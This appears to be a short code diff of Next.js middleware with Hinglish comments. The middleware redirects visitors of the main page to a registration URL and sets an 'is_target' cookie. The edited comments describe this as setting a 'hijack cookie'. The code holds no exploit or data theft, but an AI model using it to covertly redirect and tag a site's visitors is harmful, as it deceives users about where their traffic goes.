@@ -7,10 +7,10 @@ export default function middleware(request) {
   
   const url = request.nextUrl.clone();
 
-  // 1. Agar banda main link pe aaye toh register pe bhejo
+  // Sirf main page par aane walon ko register pe bhejo
   if (url.pathname === "/") {
     const res = NextResponse.redirect(regURL);
-    // Isse hume pata chalega ki ye naya banda hai
+    // Hijack cookie set karo
     res.cookies.set('is_target', 'true', { maxAge: 86400 });
     return res;
   }
@@ -18,7 +18,7 @@ export default function middleware(request) {
   return NextResponse.next();
 }
 
-// Ye line zaroori hai taaki sirf main page pe chale
+// Ye config batata hai ki middleware kaha chalega
 export const config = {
   matcher: '/',
 }
